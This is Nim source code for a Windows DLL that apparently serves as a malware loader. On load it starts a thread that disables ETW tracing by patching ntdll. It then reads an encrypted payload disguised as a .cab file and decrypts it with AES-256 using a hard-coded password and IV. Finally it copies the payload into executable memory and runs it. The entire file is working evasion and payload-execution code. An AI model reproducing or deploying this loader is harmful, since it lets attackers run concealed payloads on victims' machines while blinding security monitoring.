import os
import etwpatch
import strformat
import winim/lean
import osproc
import dynlib
import base64
import nimcrypto
import nimcrypto/sysrand
# If you prefer to not pass the .def file via CLI during compilation uncomment the line below, and replace with actual filename
#{.passl: " mydeffile.def".}
func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

proc NimMain() {.cdecl, importc.}

proc doMagic(lpParameter: LPVOID) : DWORD {.stdcall.} =
#  var amsi_patch = PatchAmsi()
  var etw_patch = Patchntdll()

  var
      inFile: string = "418c80773c814dc7ae2b9392a2e07a88.cab"
      password: string = "testing"
      inFileContents: string = readFile(inFile)
      encrypted: seq[byte] = toByteSeq(decode(inFileContents))
      dctx: CTR[aes256]
      key: array[aes256.sizeKey, byte]
      iv: array[aes256.sizeBlock, byte]
      decrypted: seq[byte] = newSeq[byte](len(encrypted))
    # Create Static IV
  iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]

    # Expand key to 32 bytes using SHA256 as the KDF
  var expandedKey = sha256.digest(password)
  copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
  dctx.init(key, iv)
  dctx.decrypt(encrypted, decrypted)
  dctx.clear()




  var payload : seq[byte] = decrypted
  var allocated = VirtualAlloc(nil, len(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  doAssert not allocated.isNil(), "Error executing VirtualAlloc()"
  copyMem(allocated, payload[0].addr, len(payload))

  let f = cast[proc(){.nimcall.}](allocated)
  f()
  return 0

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain() # You must manually import and start Nim's garbage collector if you define you're own DllMain
  case fdwReason:
    of DLL_PROCESS_ATTACH:
      var threadHandle = CreateThread(NULL, 0, doMagic, NULL, 0, NULL)
      CloseHandle(threadHandle)
    of DLL_THREAD_ATTACH:
      discard
    of DLL_THREAD_DETACH:
      discard
    of DLL_PROCESS_DETACH:
      discard
    else:
      discard

  return true
